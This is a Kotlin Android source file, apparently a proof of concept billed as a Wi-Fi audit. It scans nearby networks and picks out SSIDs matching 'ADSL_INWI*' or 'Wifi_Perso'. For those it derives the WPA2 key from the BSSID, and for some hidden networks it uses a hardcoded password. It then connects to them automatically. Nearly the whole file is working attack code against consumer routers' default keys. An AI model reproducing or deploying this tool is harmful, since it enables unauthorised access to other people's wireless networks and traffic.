package com.wifiaudit.poc

import android.content.Context
import android.net.wifi.ScanResult
import android.net.wifi.WifiManager
import android.net.wifi.WifiNetworkSpecifier
import android.net.ConnectivityManager
import android.net.NetworkRequest
import android.net.NetworkCapabilities
import android.os.Build
import androidx.annotation.RequiresApi

data class WiFiNetwork(
    val ssid: String,
    val bssid: String,
    val isHidden: Boolean,
    val signalStrength: Int,
    val isVulnerable: Boolean,
    val vulnerabilityType: VulnerabilityType?,
    val generatedPassword: String?
)

enum class VulnerabilityType {
    TYPE_A_INWI_PERSO,
    TYPE_B_HIDDEN
}

class WiFiScanner(private val context: Context) {
    
    companion object {
        private const val CONST_PASS = "YourHardcodedPassword123" // Placeholder for Type B
    }
    
    private val wifiManager: WifiManager = 
        context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
    
    fun scanNetworks(): List<WiFiNetwork> {
        if (!wifiManager.isWifiEnabled) {
            return emptyList()
        }
        
        wifiManager.startScan()
        val scanResults = wifiManager.scanResults
        
        return scanResults.map { result ->
            analyzeNetwork(result)
        }.sortedByDescending { it.signalStrength }
    }
    
    private fun analyzeNetwork(scanResult: ScanResult): WiFiNetwork {
        val ssid = if (scanResult.SSID.isNullOrEmpty()) "<Hidden Network>" else scanResult.SSID
        val bssid = scanResult.BSSID
        val isHidden = scanResult.SSID.isNullOrEmpty()
        
        // Check Type A: ADSL_INWI* or Wifi_Perso
        val isTypeA = ssid.startsWith("ADSL_INWI", ignoreCase = true) || 
                      ssid.equals("Wifi_Perso", ignoreCase = true)
        
        // Check Type B: Hidden networks with pattern SSID_x (x = 2-5)
        val isTypeB = isHidden && ssid.matches(Regex("SSID_[2-5]"))
        
        val vulnerabilityType = when {
            isTypeA -> VulnerabilityType.TYPE_A_INWI_PERSO
            isTypeB -> VulnerabilityType.TYPE_B_HIDDEN
            else -> null
        }
        
        val generatedPassword = when (vulnerabilityType) {
            VulnerabilityType.TYPE_A_INWI_PERSO -> generatePasswordTypeA(bssid)
            VulnerabilityType.TYPE_B_HIDDEN -> CONST_PASS
            null -> null
        }
        
        return WiFiNetwork(
            ssid = ssid,
            bssid = bssid,
            isHidden = isHidden,
            signalStrength = WifiManager.calculateSignalLevel(scanResult.level, 5),
            isVulnerable = vulnerabilityType != null,
            vulnerabilityType = vulnerabilityType,
            generatedPassword = generatedPassword
        )
    }
    
    private fun generatePasswordTypeA(bssid: String): String {
        // Remove colons and convert to uppercase
        // Example: aa:bb:cc:11:22:33 -> AABBCC112233
        return bssid.replace(":", "").uppercase()
    }
    
    @RequiresApi(Build.VERSION_CODES.Q)
    fun connectToNetwork(
        network: WiFiNetwork,
        onSuccess: () -> Unit,
        onFailure: (String) -> Unit
    ) {
        if (network.generatedPassword == null) {
            onFailure("No password generated for this network")
            return
        }
        
        try {
            val specifier = WifiNetworkSpecifier.Builder()
                .setSsid(network.ssid)
                .setWpa2Passphrase(network.generatedPassword)
                .build()
            
            val request = NetworkRequest.Builder()
                .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
                .setNetworkSpecifier(specifier)
                .build()
            
            val connectivityManager = 
                context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            
            val networkCallback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: android.net.Network) {
                    super.onAvailable(network)
                    onSuccess()
                }
                
                override fun onUnavailable() {
                    super.onUnavailable()
                    onFailure("Connection failed - password may be incorrect")
                }
            }
            
            connectivityManager.requestNetwork(request, networkCallback)
            
        } catch (e: Exception) {
            onFailure("Error: ${e.message}")
        }
    }
}
